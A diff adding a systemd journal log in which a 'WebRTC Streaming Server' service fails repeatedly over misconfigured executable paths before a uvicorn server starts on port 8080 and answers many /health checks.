@@ -1,0 +1,1142 @@
+Oct 20 12:58:22 ip-172-31-41-158 systemd[1]: Started WebRTC Streaming Server.
+Oct 20 12:58:22 ip-172-31-41-158 systemd[67570]: webrtc.service: Failed to locate executable /home/ubuntu/webrtc/stream_api:app: No such file or directory
+Oct 20 12:58:22 ip-172-31-41-158 systemd[67570]: webrtc.service: Failed at step EXEC spawning /home/ubuntu/webrtc/stream_api:app: No such file or directory
+Oct 20 12:58:22 ip-172-31-41-158 systemd[1]: webrtc.service: Main process exited, code=exited, status=203/EXEC
+Oct 20 12:58:22 ip-172-31-41-158 systemd[1]: webrtc.service: Failed with result 'exit-code'.
+Oct 20 12:58:22 ip-172-31-41-158 systemd[1]: webrtc.service: Scheduled restart job, restart counter is at 1.
+Oct 20 12:58:22 ip-172-31-41-158 systemd[1]: Stopped WebRTC Streaming Server.
+Oct 20 12:58:23 ip-172-31-41-158 systemd[1]: Started WebRTC Streaming Server.
+Oct 20 12:58:23 ip-172-31-41-158 systemd[67572]: webrtc.service: Failed to locate executable /home/ubuntu/webrtc/stream_api:app: No such file or directory
+Oct 20 12:58:23 ip-172-31-41-158 systemd[67572]: webrtc.service: Failed at step EXEC spawning /home/ubuntu/webrtc/stream_api:app: No such file or directory
+Oct 20 12:58:23 ip-172-31-41-158 systemd[1]: webrtc.service: Main process exited, code=exited, status=203/EXEC
+Oct 20 12:58:23 ip-172-31-41-158 systemd[1]: webrtc.service: Failed with result 'exit-code'.
+Oct 20 12:58:23 ip-172-31-41-158 systemd[1]: webrtc.service: Scheduled restart job, restart counter is at 2.
+Oct 20 12:58:23 ip-172-31-41-158 systemd[1]: Stopped WebRTC Streaming Server.
+Oct 20 12:58:23 ip-172-31-41-158 systemd[1]: Started WebRTC Streaming Server.
+Oct 20 12:58:23 ip-172-31-41-158 systemd[67574]: webrtc.service: Failed to locate executable /home/ubuntu/webrtc/stream_api:app: No such file or directory
+Oct 20 12:58:23 ip-172-31-41-158 systemd[67574]: webrtc.service: Failed at step EXEC spawning /home/ubuntu/webrtc/stream_api:app: No such file or directory
+Oct 20 12:58:23 ip-172-31-41-158 systemd[1]: webrtc.service: Main process exited, code=exited, status=203/EXEC
+Oct 20 12:58:23 ip-172-31-41-158 systemd[1]: webrtc.service: Failed with result 'exit-code'.
+Oct 20 12:58:23 ip-172-31-41-158 systemd[1]: webrtc.service: Scheduled restart job, restart counter is at 3.
+Oct 20 12:58:23 ip-172-31-41-158 systemd[1]: Stopped WebRTC Streaming Server.
+Oct 20 12:58:23 ip-172-31-41-158 systemd[1]: Started WebRTC Streaming Server.
+Oct 20 12:58:23 ip-172-31-41-158 systemd[67575]: webrtc.service: Failed to locate executable /home/ubuntu/webrtc/stream_api:app: No such file or directory
+Oct 20 12:58:23 ip-172-31-41-158 systemd[67575]: webrtc.service: Failed at step EXEC spawning /home/ubuntu/webrtc/stream_api:app: No such file or directory
+Oct 20 12:58:23 ip-172-31-41-158 systemd[1]: webrtc.service: Main process exited, code=exited, status=203/EXEC
+Oct 20 12:58:23 ip-172-31-41-158 systemd[1]: webrtc.service: Failed with result 'exit-code'.
+Oct 20 12:58:23 ip-172-31-41-158 systemd[1]: webrtc.service: Scheduled restart job, restart counter is at 4.
+Oct 20 12:58:23 ip-172-31-41-158 systemd[1]: Stopped WebRTC Streaming Server.
+Oct 20 12:58:23 ip-172-31-41-158 systemd[1]: Started WebRTC Streaming Server.
+Oct 20 12:58:23 ip-172-31-41-158 systemd[67576]: webrtc.service: Failed to locate executable /home/ubuntu/webrtc/stream_api:app: No such file or directory
+Oct 20 12:58:23 ip-172-31-41-158 systemd[67576]: webrtc.service: Failed at step EXEC spawning /home/ubuntu/webrtc/stream_api:app: No such file or directory
+Oct 20 12:58:23 ip-172-31-41-158 systemd[1]: webrtc.service: Main process exited, code=exited, status=203/EXEC
+Oct 20 12:58:23 ip-172-31-41-158 systemd[1]: webrtc.service: Failed with result 'exit-code'.
+Oct 20 12:58:23 ip-172-31-41-158 systemd[1]: webrtc.service: Scheduled restart job, restart counter is at 5.
+Oct 20 12:58:23 ip-172-31-41-158 systemd[1]: Stopped WebRTC Streaming Server.
+Oct 20 12:58:23 ip-172-31-41-158 systemd[1]: webrtc.service: Start request repeated too quickly.
+Oct 20 12:58:23 ip-172-31-41-158 systemd[1]: webrtc.service: Failed with result 'exit-code'.
+Oct 20 12:58:23 ip-172-31-41-158 systemd[1]: Failed to start WebRTC Streaming Server.
+Oct 20 13:02:00 ip-172-31-41-158 systemd[1]: Started WebRTC Streaming Server.
+Oct 20 13:02:00 ip-172-31-41-158 systemd[67664]: webrtc.service: Failed to locate executable /home/ubuntu/webrtc/uvicorn: No such file or directory
+Oct 20 13:02:00 ip-172-31-41-158 systemd[67664]: webrtc.service: Failed at step EXEC spawning /home/ubuntu/webrtc/uvicorn: No such file or directory
+Oct 20 13:02:00 ip-172-31-41-158 systemd[1]: webrtc.service: Main process exited, code=exited, status=203/EXEC
+Oct 20 13:02:00 ip-172-31-41-158 systemd[1]: webrtc.service: Failed with result 'exit-code'.
+Oct 20 13:02:00 ip-172-31-41-158 systemd[1]: webrtc.service: Scheduled restart job, restart counter is at 1.
+Oct 20 13:02:00 ip-172-31-41-158 systemd[1]: Stopped WebRTC Streaming Server.
+Oct 20 13:02:00 ip-172-31-41-158 systemd[1]: Started WebRTC Streaming Server.
+Oct 20 13:02:00 ip-172-31-41-158 systemd[67665]: webrtc.service: Failed to locate executable /home/ubuntu/webrtc/uvicorn: No such file or directory
+Oct 20 13:02:00 ip-172-31-41-158 systemd[67665]: webrtc.service: Failed at step EXEC spawning /home/ubuntu/webrtc/uvicorn: No such file or directory
+Oct 20 13:02:00 ip-172-31-41-158 systemd[1]: webrtc.service: Main process exited, code=exited, status=203/EXEC
+Oct 20 13:02:00 ip-172-31-41-158 systemd[1]: webrtc.service: Failed with result 'exit-code'.
+Oct 20 13:02:00 ip-172-31-41-158 systemd[1]: webrtc.service: Scheduled restart job, restart counter is at 2.
+Oct 20 13:02:00 ip-172-31-41-158 systemd[1]: Stopped WebRTC Streaming Server.
+Oct 20 13:02:01 ip-172-31-41-158 systemd[1]: Started WebRTC Streaming Server.
+Oct 20 13:02:01 ip-172-31-41-158 systemd[67666]: webrtc.service: Failed to locate executable /home/ubuntu/webrtc/uvicorn: No such file or directory
+Oct 20 13:02:01 ip-172-31-41-158 systemd[67666]: webrtc.service: Failed at step EXEC spawning /home/ubuntu/webrtc/uvicorn: No such file or directory
+Oct 20 13:02:01 ip-172-31-41-158 systemd[1]: webrtc.service: Main process exited, code=exited, status=203/EXEC
+Oct 20 13:02:01 ip-172-31-41-158 systemd[1]: webrtc.service: Failed with result 'exit-code'.
+Oct 20 13:02:01 ip-172-31-41-158 systemd[1]: webrtc.service: Scheduled restart job, restart counter is at 3.
+Oct 20 13:02:01 ip-172-31-41-158 systemd[1]: Stopped WebRTC Streaming Server.
+Oct 20 13:02:01 ip-172-31-41-158 systemd[1]: Started WebRTC Streaming Server.
+Oct 20 13:02:01 ip-172-31-41-158 systemd[67667]: webrtc.service: Failed to locate executable /home/ubuntu/webrtc/uvicorn: No such file or directory
+Oct 20 13:02:01 ip-172-31-41-158 systemd[67667]: webrtc.service: Failed at step EXEC spawning /home/ubuntu/webrtc/uvicorn: No such file or directory
+Oct 20 13:02:01 ip-172-31-41-158 systemd[1]: webrtc.service: Main process exited, code=exited, status=203/EXEC
+Oct 20 13:02:01 ip-172-31-41-158 systemd[1]: webrtc.service: Failed with result 'exit-code'.
+Oct 20 13:02:01 ip-172-31-41-158 systemd[1]: webrtc.service: Scheduled restart job, restart counter is at 4.
+Oct 20 13:02:01 ip-172-31-41-158 systemd[1]: Stopped WebRTC Streaming Server.
+Oct 20 13:02:01 ip-172-31-41-158 systemd[1]: Started WebRTC Streaming Server.
+Oct 20 13:02:01 ip-172-31-41-158 systemd[67668]: webrtc.service: Failed to locate executable /home/ubuntu/webrtc/uvicorn: No such file or directory
+Oct 20 13:02:01 ip-172-31-41-158 systemd[67668]: webrtc.service: Failed at step EXEC spawning /home/ubuntu/webrtc/uvicorn: No such file or directory
+Oct 20 13:02:01 ip-172-31-41-158 systemd[1]: webrtc.service: Main process exited, code=exited, status=203/EXEC
+Oct 20 13:02:01 ip-172-31-41-158 systemd[1]: webrtc.service: Failed with result 'exit-code'.
+Oct 20 13:02:01 ip-172-31-41-158 systemd[1]: webrtc.service: Scheduled restart job, restart counter is at 5.
+Oct 20 13:02:01 ip-172-31-41-158 systemd[1]: Stopped WebRTC Streaming Server.
+Oct 20 13:02:01 ip-172-31-41-158 systemd[1]: webrtc.service: Start request repeated too quickly.
+Oct 20 13:02:01 ip-172-31-41-158 systemd[1]: webrtc.service: Failed with result 'exit-code'.
+Oct 20 13:02:01 ip-172-31-41-158 systemd[1]: Failed to start WebRTC Streaming Server.
+Oct 20 13:02:17 ip-172-31-41-158 systemd[1]: Started WebRTC Streaming Server.
+Oct 20 13:02:17 ip-172-31-41-158 systemd[67678]: webrtc.service: Failed to locate executable /home/ubuntu/webrtc/uvicorn: No such file or directory
+Oct 20 13:02:17 ip-172-31-41-158 systemd[67678]: webrtc.service: Failed at step EXEC spawning /home/ubuntu/webrtc/uvicorn: No such file or directory
+Oct 20 13:02:17 ip-172-31-41-158 systemd[1]: webrtc.service: Main process exited, code=exited, status=203/EXEC
+Oct 20 13:02:17 ip-172-31-41-158 systemd[1]: webrtc.service: Failed with result 'exit-code'.
+Oct 20 13:02:17 ip-172-31-41-158 systemd[1]: webrtc.service: Scheduled restart job, restart counter is at 1.
+Oct 20 13:02:17 ip-172-31-41-158 systemd[1]: Stopped WebRTC Streaming Server.
+Oct 20 13:02:18 ip-172-31-41-158 systemd[1]: Started WebRTC Streaming Server.
+Oct 20 13:02:18 ip-172-31-41-158 systemd[67679]: webrtc.service: Failed to locate executable /home/ubuntu/webrtc/uvicorn: No such file or directory
+Oct 20 13:02:18 ip-172-31-41-158 systemd[67679]: webrtc.service: Failed at step EXEC spawning /home/ubuntu/webrtc/uvicorn: No such file or directory
+Oct 20 13:02:18 ip-172-31-41-158 systemd[1]: webrtc.service: Main process exited, code=exited, status=203/EXEC
+Oct 20 13:02:18 ip-172-31-41-158 systemd[1]: webrtc.service: Failed with result 'exit-code'.
+Oct 20 13:02:18 ip-172-31-41-158 systemd[1]: webrtc.service: Scheduled restart job, restart counter is at 2.
+Oct 20 13:02:18 ip-172-31-41-158 systemd[1]: Stopped WebRTC Streaming Server.
+Oct 20 13:02:18 ip-172-31-41-158 systemd[1]: Started WebRTC Streaming Server.
+Oct 20 13:02:18 ip-172-31-41-158 systemd[67680]: webrtc.service: Failed to locate executable /home/ubuntu/webrtc/uvicorn: No such file or directory
+Oct 20 13:02:18 ip-172-31-41-158 systemd[67680]: webrtc.service: Failed at step EXEC spawning /home/ubuntu/webrtc/uvicorn: No such file or directory
+Oct 20 13:02:18 ip-172-31-41-158 systemd[1]: webrtc.service: Main process exited, code=exited, status=203/EXEC
+Oct 20 13:02:18 ip-172-31-41-158 systemd[1]: webrtc.service: Failed with result 'exit-code'.
+Oct 20 13:02:18 ip-172-31-41-158 systemd[1]: webrtc.service: Scheduled restart job, restart counter is at 3.
+Oct 20 13:02:18 ip-172-31-41-158 systemd[1]: Stopped WebRTC Streaming Server.
+Oct 20 13:02:18 ip-172-31-41-158 systemd[1]: Started WebRTC Streaming Server.
+Oct 20 13:02:18 ip-172-31-41-158 systemd[67681]: webrtc.service: Failed to locate executable /home/ubuntu/webrtc/uvicorn: No such file or directory
+Oct 20 13:02:18 ip-172-31-41-158 systemd[67681]: webrtc.service: Failed at step EXEC spawning /home/ubuntu/webrtc/uvicorn: No such file or directory
+Oct 20 13:02:18 ip-172-31-41-158 systemd[1]: webrtc.service: Main process exited, code=exited, status=203/EXEC
+Oct 20 13:02:18 ip-172-31-41-158 systemd[1]: webrtc.service: Failed with result 'exit-code'.
+Oct 20 13:02:18 ip-172-31-41-158 systemd[1]: webrtc.service: Scheduled restart job, restart counter is at 4.
+Oct 20 13:02:18 ip-172-31-41-158 systemd[1]: Stopped WebRTC Streaming Server.
+Oct 20 13:02:18 ip-172-31-41-158 systemd[1]: Started WebRTC Streaming Server.
+Oct 20 13:02:18 ip-172-31-41-158 systemd[67682]: webrtc.service: Failed to locate executable /home/ubuntu/webrtc/uvicorn: No such file or directory
+Oct 20 13:02:18 ip-172-31-41-158 systemd[67682]: webrtc.service: Failed at step EXEC spawning /home/ubuntu/webrtc/uvicorn: No such file or directory
+Oct 20 13:02:18 ip-172-31-41-158 systemd[1]: webrtc.service: Main process exited, code=exited, status=203/EXEC
+Oct 20 13:02:18 ip-172-31-41-158 systemd[1]: webrtc.service: Failed with result 'exit-code'.
+Oct 20 13:02:18 ip-172-31-41-158 systemd[1]: webrtc.service: Scheduled restart job, restart counter is at 5.
+Oct 20 13:02:18 ip-172-31-41-158 systemd[1]: Stopped WebRTC Streaming Server.
+Oct 20 13:02:18 ip-172-31-41-158 systemd[1]: webrtc.service: Start request repeated too quickly.
+Oct 20 13:02:18 ip-172-31-41-158 systemd[1]: webrtc.service: Failed with result 'exit-code'.
+Oct 20 13:02:18 ip-172-31-41-158 systemd[1]: Failed to start WebRTC Streaming Server.
+Oct 20 13:03:30 ip-172-31-41-158 systemd[1]: Started WebRTC Streaming Server.
+Oct 20 13:03:30 ip-172-31-41-158 systemd[67729]: webrtc.service: Failed to locate executable /home/ubuntu/webrtc/venv/bin/uvicorn: No such file or directory
+Oct 20 13:03:30 ip-172-31-41-158 systemd[67729]: webrtc.service: Failed at step EXEC spawning /home/ubuntu/webrtc/venv/bin/uvicorn: No such file or directory
+Oct 20 13:03:30 ip-172-31-41-158 systemd[1]: webrtc.service: Main process exited, code=exited, status=203/EXEC
+Oct 20 13:03:30 ip-172-31-41-158 systemd[1]: webrtc.service: Failed with result 'exit-code'.
+Oct 20 13:03:30 ip-172-31-41-158 systemd[1]: webrtc.service: Scheduled restart job, restart counter is at 1.
+Oct 20 13:03:30 ip-172-31-41-158 systemd[1]: Stopped WebRTC Streaming Server.
+Oct 20 13:03:30 ip-172-31-41-158 systemd[1]: Started WebRTC Streaming Server.
+Oct 20 13:03:30 ip-172-31-41-158 systemd[67730]: webrtc.service: Failed to locate executable /home/ubuntu/webrtc/venv/bin/uvicorn: No such file or directory
+Oct 20 13:03:30 ip-172-31-41-158 systemd[67730]: webrtc.service: Failed at step EXEC spawning /home/ubuntu/webrtc/venv/bin/uvicorn: No such file or directory
+Oct 20 13:03:30 ip-172-31-41-158 systemd[1]: webrtc.service: Main process exited, code=exited, status=203/EXEC
+Oct 20 13:03:30 ip-172-31-41-158 systemd[1]: webrtc.service: Failed with result 'exit-code'.
+Oct 20 13:03:30 ip-172-31-41-158 systemd[1]: webrtc.service: Scheduled restart job, restart counter is at 2.
+Oct 20 13:03:30 ip-172-31-41-158 systemd[1]: Stopped WebRTC Streaming Server.
+Oct 20 13:03:30 ip-172-31-41-158 systemd[1]: Started WebRTC Streaming Server.
+Oct 20 13:03:30 ip-172-31-41-158 systemd[67731]: webrtc.service: Failed to locate executable /home/ubuntu/webrtc/venv/bin/uvicorn: No such file or directory
+Oct 20 13:03:30 ip-172-31-41-158 systemd[67731]: webrtc.service: Failed at step EXEC spawning /home/ubuntu/webrtc/venv/bin/uvicorn: No such file or directory
+Oct 20 13:03:30 ip-172-31-41-158 systemd[1]: webrtc.service: Main process exited, code=exited, status=203/EXEC
+Oct 20 13:03:30 ip-172-31-41-158 systemd[1]: webrtc.service: Failed with result 'exit-code'.
+Oct 20 13:03:30 ip-172-31-41-158 systemd[1]: webrtc.service: Scheduled restart job, restart counter is at 3.
+Oct 20 13:03:30 ip-172-31-41-158 systemd[1]: Stopped WebRTC Streaming Server.
+Oct 20 13:03:31 ip-172-31-41-158 systemd[1]: Started WebRTC Streaming Server.
+Oct 20 13:03:31 ip-172-31-41-158 systemd[67732]: webrtc.service: Failed to locate executable /home/ubuntu/webrtc/venv/bin/uvicorn: No such file or directory
+Oct 20 13:03:31 ip-172-31-41-158 systemd[67732]: webrtc.service: Failed at step EXEC spawning /home/ubuntu/webrtc/venv/bin/uvicorn: No such file or directory
+Oct 20 13:03:31 ip-172-31-41-158 systemd[1]: webrtc.service: Main process exited, code=exited, status=203/EXEC
+Oct 20 13:03:31 ip-172-31-41-158 systemd[1]: webrtc.service: Failed with result 'exit-code'.
+Oct 20 13:03:31 ip-172-31-41-158 systemd[1]: webrtc.service: Scheduled restart job, restart counter is at 4.
+Oct 20 13:03:31 ip-172-31-41-158 systemd[1]: Stopped WebRTC Streaming Server.
+Oct 20 13:03:31 ip-172-31-41-158 systemd[1]: Started WebRTC Streaming Server.
+Oct 20 13:03:31 ip-172-31-41-158 systemd[67733]: webrtc.service: Failed to locate executable /home/ubuntu/webrtc/venv/bin/uvicorn: No such file or directory
+Oct 20 13:03:31 ip-172-31-41-158 systemd[67733]: webrtc.service: Failed at step EXEC spawning /home/ubuntu/webrtc/venv/bin/uvicorn: No such file or directory
+Oct 20 13:03:31 ip-172-31-41-158 systemd[1]: webrtc.service: Main process exited, code=exited, status=203/EXEC
+Oct 20 13:03:31 ip-172-31-41-158 systemd[1]: webrtc.service: Failed with result 'exit-code'.
+Oct 20 13:03:31 ip-172-31-41-158 systemd[1]: webrtc.service: Scheduled restart job, restart counter is at 5.
+Oct 20 13:03:31 ip-172-31-41-158 systemd[1]: Stopped WebRTC Streaming Server.
+Oct 20 13:03:31 ip-172-31-41-158 systemd[1]: webrtc.service: Start request repeated too quickly.
+Oct 20 13:03:31 ip-172-31-41-158 systemd[1]: webrtc.service: Failed with result 'exit-code'.
+Oct 20 13:03:31 ip-172-31-41-158 systemd[1]: Failed to start WebRTC Streaming Server.
+Oct 20 13:10:21 ip-172-31-41-158 systemd[1]: Started WebRTC Streaming Server.
+Oct 20 13:10:22 ip-172-31-41-158 python3[67798]: INFO:     Started server process [67798]
+Oct 20 13:10:22 ip-172-31-41-158 python3[67798]: INFO:     Waiting for application startup.
+Oct 20 13:10:22 ip-172-31-41-158 python3[67798]: INFO:     Application startup complete.
+Oct 20 13:10:22 ip-172-31-41-158 python3[67798]: INFO:     Uvicorn running on http://0.0.0.0:8080 (Press CTRL+C to quit)
+Oct 20 13:11:31 ip-172-31-41-158 python3[67798]: INFO:     121.141.19.79:57156 - "GET /health HTTP/1.1" 200 OK
+Oct 20 13:13:25 ip-172-31-41-158 python3[67798]: WARNING:  Invalid HTTP request received.
+Oct 20 13:13:29 ip-172-31-41-158 python3[67798]: INFO:     121.141.19.79:57216 - "GET /health HTTP/1.1" 200 OK
+Oct 20 13:14:03 ip-172-31-41-158 python3[67798]: INFO:     66.102.7.194:56204 - "GET /health HTTP/1.1" 200 OK
+Oct 20 13:26:52 ip-172-31-41-158 python3[67798]: INFO:     121.141.19.79:3327 - "GET /health HTTP/1.1" 200 OK
+Oct 20 13:26:52 ip-172-31-41-158 python3[67798]: INFO:     121.141.19.79:3327 - "GET /health HTTP/1.1" 200 OK
+Oct 20 13:26:52 ip-172-31-41-158 python3[67798]: INFO:     121.141.19.79:3327 - "GET /health HTTP/1.1" 200 OK
+Oct 20 13:26:52 ip-172-31-41-158 python3[67798]: INFO:     121.141.19.79:3327 - "GET /health HTTP/1.1" 200 OK
+Oct 20 13:26:52 ip-172-31-41-158 python3[67798]: INFO:     121.141.19.79:3327 - "GET /health HTTP/1.1" 200 OK
+Oct 20 13:26:52 ip-172-31-41-158 python3[67798]: INFO:     121.141.19.79:3327 - "GET /health HTTP/1.1" 200 OK
+Oct 20 13:26:53 ip-172-31-41-158 python3[67798]: INFO:     121.141.19.79:3327 - "GET /health HTTP/1.1" 200 OK
+Oct 20 13:26:53 ip-172-31-41-158 python3[67798]: INFO:     121.141.19.79:3327 - "GET /health HTTP/1.1" 200 OK
+Oct 20 13:26:53 ip-172-31-41-158 python3[67798]: INFO:     121.141.19.79:3327 - "GET /health HTTP/1.1" 200 OK
+Oct 20 13:26:53 ip-172-31-41-158 python3[67798]: INFO:     121.141.19.79:3327 - "GET /health HTTP/1.1" 200 OK
+Oct 20 13:26:54 ip-172-31-41-158 python3[67798]: INFO:     121.141.19.79:3327 - "GET /health HTTP/1.1" 200 OK
+Oct 20 13:26:55 ip-172-31-41-158 python3[67798]: INFO:     121.141.19.79:3327 - "GET /health HTTP/1.1" 200 OK
+Oct 20 13:26:56 ip-172-31-41-158 python3[67798]: INFO:     121.141.19.79:3327 - "GET /health HTTP/1.1" 200 OK
+Oct 20 13:26:57 ip-172-31-41-158 python3[67798]: INFO:     121.141.19.79:3327 - "GET /health HTTP/1.1" 200 OK
+Oct 20 13:26:58 ip-172-31-41-158 python3[67798]: INFO:     121.141.19.79:3327 - "GET /health HTTP/1.1" 200 OK
+Oct 20 13:26:58 ip-172-31-41-158 python3[67798]: INFO:     121.141.19.79:3327 - "GET /health HTTP/1.1" 200 OK
+Oct 20 13:26:58 ip-172-31-41-158 python3[67798]: INFO:     121.141.19.79:3327 - "GET /health HTTP/1.1" 200 OK
+Oct 20 13:26:58 ip-172-31-41-158 python3[67798]: INFO:     121.141.19.79:3327 - "GET /health HTTP/1.1" 200 OK
+Oct 20 13:26:58 ip-172-31-41-158 python3[67798]: INFO:     121.141.19.79:3327 - "GET /health HTTP/1.1" 200 OK
+Oct 20 13:26:58 ip-172-31-41-158 python3[67798]: INFO:     121.141.19.79:3327 - "GET /health HTTP/1.1" 200 OK
+Oct 20 13:26:59 ip-172-31-41-158 python3[67798]: INFO:     121.141.19.79:3327 - "GET /health HTTP/1.1" 200 OK
+Oct 20 13:27:00 ip-172-31-41-158 python3[67798]: INFO:     121.141.19.79:3327 - "GET /health HTTP/1.1" 200 OK
+Oct 20 13:27:01 ip-172-31-41-158 python3[67798]: INFO:     121.141.19.79:3327 - "GET /health HTTP/1.1" 200 OK
+Oct 20 13:27:02 ip-172-31-41-158 python3[67798]: INFO:     121.141.19.79:3327 - "GET /health HTTP/1.1" 200 OK
+Oct 20 13:27:03 ip-172-31-41-158 python3[67798]: INFO:     121.141.19.79:3327 - "GET /health HTTP/1.1" 200 OK
+Oct 20 13:27:03 ip-172-31-41-158 python3[67798]: INFO:     121.141.19.79:3327 - "GET /health HTTP/1.1" 200 OK
+Oct 20 13:27:03 ip-172-31-41-158 python3[67798]: INFO:     121.141.19.79:3327 - "GET /health HTTP/1.1" 200 OK
+Oct 20 13:27:03 ip-172-31-41-158 python3[67798]: INFO:     121.141.19.79:3327 - "GET /health HTTP/1.1" 200 OK
+Oct 20 13:27:03 ip-172-31-41-158 python3[67798]: INFO:     121.141.19.79:3327 - "GET /health HTTP/1.1" 200 OK
+Oct 20 13:27:03 ip-172-31-41-158 python3[67798]: INFO:     121.141.19.79:3327 - "GET /health HTTP/1.1" 200 OK
+Oct 20 13:27:03 ip-172-31-41-158 python3[67798]: INFO:     121.141.19.79:3327 - "GET /health HTTP/1.1" 200 OK
+Oct 20 13:27:04 ip-172-31-41-158 python3[67798]: INFO:     121.141.19.79:3327 - "GET /health HTTP/1.1" 200 OK
+Oct 20 13:27:04 ip-172-31-41-158 python3[67798]: INFO:     121.141.19.79:3327 - "GET /health HTTP/1.1" 200 OK
+Oct 20 13:27:05 ip-172-31-41-158 python3[67798]: INFO:     121.141.19.79:3327 - "GET /health HTTP/1.1" 200 OK
+Oct 20 13:27:06 ip-172-31-41-158 python3[67798]: INFO:     121.141.19.79:3327 - "GET /health HTTP/1.1" 200 OK
+Oct 20 13:27:07 ip-172-31-41-158 python3[67798]: INFO:     121.141.19.79:3327 - "GET /health HTTP/1.1" 200 OK
+Oct 20 13:27:07 ip-172-31-41-158 python3[67798]: INFO:     121.141.19.79:3327 - "GET /health HTTP/1.1" 200 OK
+Oct 20 13:27:08 ip-172-31-41-158 python3[67798]: INFO:     121.141.19.79:3327 - "GET /health HTTP/1.1" 200 OK
+Oct 20 13:27:09 ip-172-31-41-158 python3[67798]: INFO:     121.141.19.79:3327 - "GET /health HTTP/1.1" 200 OK
+Oct 20 13:27:10 ip-172-31-41-158 python3[67798]: INFO:     121.141.19.79:3327 - "GET /health HTTP/1.1" 200 OK
+Oct 20 13:27:10 ip-172-31-41-158 python3[67798]: INFO:     121.141.19.79:3327 - "GET /health HTTP/1.1" 200 OK
+Oct 20 13:27:11 ip-172-31-41-158 python3[67798]: INFO:     121.141.19.79:3327 - "GET /health HTTP/1.1" 200 OK
+Oct 20 13:27:12 ip-172-31-41-158 python3[67798]: INFO:     121.141.19.79:3327 - "GET /health HTTP/1.1" 200 OK
+Oct 20 13:27:13 ip-172-31-41-158 python3[67798]: INFO:     121.141.19.79:3327 - "GET /health HTTP/1.1" 200 OK
+Oct 20 13:27:13 ip-172-31-41-158 python3[67798]: INFO:     121.141.19.79:3327 - "GET /health HTTP/1.1" 200 OK
+Oct 20 13:27:14 ip-172-31-41-158 python3[67798]: INFO:     121.141.19.79:3327 - "GET /health HTTP/1.1" 200 OK
+Oct 20 13:27:15 ip-172-31-41-158 python3[67798]: INFO:     121.141.19.79:3327 - "GET /health HTTP/1.1" 200 OK
+Oct 20 13:27:16 ip-172-31-41-158 python3[67798]: INFO:     121.141.19.79:3327 - "GET /health HTTP/1.1" 200 OK
+Oct 20 13:27:16 ip-172-31-41-158 python3[67798]: INFO:     121.141.19.79:3327 - "GET /health HTTP/1.1" 200 OK
+Oct 20 13:27:17 ip-172-31-41-158 python3[67798]: INFO:     121.141.19.79:3327 - "GET /health HTTP/1.1" 200 OK
+Oct 20 13:27:18 ip-172-31-41-158 python3[67798]: INFO:     121.141.19.79:3327 - "GET /health HTTP/1.1" 200 OK
+Oct 20 13:27:19 ip-172-31-41-158 python3[67798]: INFO:     121.141.19.79:3327 - "GET /health HTTP/1.1" 200 OK
+Oct 20 13:27:19 ip-172-31-41-158 python3[67798]: INFO:     121.141.19.79:3327 - "GET /health HTTP/1.1" 200 OK
+Oct 20 13:27:20 ip-172-31-41-158 python3[67798]: INFO:     121.141.19.79:3327 - "GET /health HTTP/1.1" 200 OK
+Oct 20 13:27:20 ip-172-31-41-158 python3[67798]: INFO:     121.141.19.79:3327 - "GET /health HTTP/1.1" 200 OK
+Oct 20 13:27:20 ip-172-31-41-158 python3[67798]: INFO:     121.141.19.79:3327 - "GET /health HTTP/1.1" 200 OK
+Oct 20 13:27:20 ip-172-31-41-158 python3[67798]: INFO:     121.141.19.79:3327 - "GET /health HTTP/1.1" 200 OK
+Oct 20 13:27:21 ip-172-31-41-158 python3[67798]: INFO:     121.141.19.79:3327 - "GET /health HTTP/1.1" 200 OK
+Oct 20 13:27:21 ip-172-31-41-158 python3[67798]: INFO:     121.141.19.79:3327 - "GET /health HTTP/1.1" 200 OK
+Oct 20 13:27:21 ip-172-31-41-158 python3[67798]: INFO:     121.141.19.79:3327 - "GET /health HTTP/1.1" 200 OK
+Oct 20 13:27:22 ip-172-31-41-158 python3[67798]: INFO:     121.141.19.79:3327 - "GET /health HTTP/1.1" 200 OK
+Oct 20 13:27:22 ip-172-31-41-158 python3[67798]: INFO:     121.141.19.79:3327 - "GET /health HTTP/1.1" 200 OK
+Oct 20 13:27:23 ip-172-31-41-158 python3[67798]: INFO:     121.141.19.79:3327 - "GET /health HTTP/1.1" 200 OK
+Oct 20 13:27:24 ip-172-31-41-158 python3[67798]: INFO:     121.141.19.79:3327 - "GET /health HTTP/1.1" 200 OK
+Oct 20 13:27:24 ip-172-31-41-158 python3[67798]: INFO:     121.141.19.79:3340 - "GET /health HTTP/1.1" 200 OK
+Oct 20 13:27:24 ip-172-31-41-158 python3[67798]: INFO:     121.141.19.79:3340 - "GET /health HTTP/1.1" 200 OK
+Oct 20 13:27:24 ip-172-31-41-158 python3[67798]: INFO:     121.141.19.79:3340 - "GET /health HTTP/1.1" 200 OK
+Oct 20 13:27:24 ip-172-31-41-158 python3[67798]: INFO:     121.141.19.79:3340 - "GET /health HTTP/1.1" 200 OK
+Oct 20 13:27:24 ip-172-31-41-158 python3[67798]: INFO:     121.141.19.79:3340 - "GET /health HTTP/1.1" 200 OK
+Oct 20 13:27:24 ip-172-31-41-158 python3[67798]: INFO:     121.141.19.79:3340 - "GET /health HTTP/1.1" 200 OK
+Oct 20 13:27:24 ip-172-31-41-158 python3[67798]: INFO:     121.141.19.79:3340 - "GET /health HTTP/1.1" 200 OK
+Oct 20 13:27:24 ip-172-31-41-158 python3[67798]: INFO:     121.141.19.79:3340 - "GET /health HTTP/1.1" 200 OK
+Oct 20 13:27:25 ip-172-31-41-158 python3[67798]: INFO:     121.141.19.79:3340 - "GET /health HTTP/1.1" 200 OK
+Oct 20 13:27:25 ip-172-31-41-158 python3[67798]: INFO:     121.141.19.79:3340 - "GET /health HTTP/1.1" 200 OK
+Oct 20 13:27:25 ip-172-31-41-158 python3[67798]: INFO:     121.141.19.79:3340 - "GET /health HTTP/1.1" 200 OK
+Oct 20 13:27:26 ip-172-31-41-158 python3[67798]: INFO:     121.141.19.79:3340 - "GET /health HTTP/1.1" 200 OK
+Oct 20 13:27:27 ip-172-31-41-158 python3[67798]: INFO:     121.141.19.79:3340 - "GET /health HTTP/1.1" 200 OK
+Oct 20 13:27:28 ip-172-31-41-158 python3[67798]: INFO:     121.141.19.79:3340 - "GET /health HTTP/1.1" 200 OK
+Oct 20 13:27:28 ip-172-31-41-158 python3[67798]: INFO:     121.141.19.79:3340 - "GET /health HTTP/1.1" 200 OK
+Oct 20 13:27:29 ip-172-31-41-158 python3[67798]: INFO:     121.141.19.79:3340 - "GET /health HTTP/1.1" 200 OK
+Oct 20 13:27:30 ip-172-31-41-158 python3[67798]: INFO:     121.141.19.79:3340 - "GET /health HTTP/1.1" 200 OK
